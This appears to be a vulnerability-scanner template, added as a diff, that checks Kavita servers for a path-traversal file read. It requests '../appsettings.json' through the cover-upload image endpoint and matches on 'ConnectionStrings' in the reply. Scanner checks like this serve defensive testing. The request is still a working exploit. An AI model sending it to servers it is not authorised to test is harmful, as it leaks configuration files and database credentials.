@@ -1,0 +1,23 @@
+id: yaml-poc-kavita-kavita-readfile-CT-483472
+info:
+  name: Yaml Poc Kavita Kavita Readfile Ct 483472
+  author: converted
+  severity: high
+  description: 'Converted from xpoc: yaml-poc-kavita-kavita-readfile-CT-483472'
+  tags: lfi
+  reference:
+  - https://huntr.dev/bounties/2eef332b-65d2-4f13-8c39-44a8771a6f18/
+http:
+- method: GET
+  path:
+  - /api/image/cover-upload?filename=../appsettings.json
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - Microsoft.AspNetCore.Hosting.Internal.WebHost
+    - ConnectionStrings
